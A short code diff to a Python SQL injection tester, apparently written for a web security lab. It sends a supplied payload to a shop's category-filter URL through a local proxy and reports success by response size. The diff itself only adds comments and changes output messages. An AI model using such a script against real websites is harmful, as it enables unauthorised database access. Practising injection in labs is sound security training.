@@ -5,11 +5,12 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
 
+#expected normal page size in bytes
 THRESHOLD_SIZE = 4783
 
 
 def exploit_sqli(url, payload):
-	uri = '/filter?category=Gifts'
+	uri = '/filter?category=Gifts'  #CHANGE THIS
 	r = requests.get(url + uri + payload, verify = False, proxies=proxies)
 
 	if len(r.content) > THRESHOLD_SIZE:
@@ -28,7 +29,7 @@ if __name__ == "__main__":
 		sys.exit(-1)
 
 	if exploit_sqli(url,payload):
-		print("Injection Successful")
+		print("[+] Injection Successful")
 	else:
 		print("[-] SQLi Failed")
 
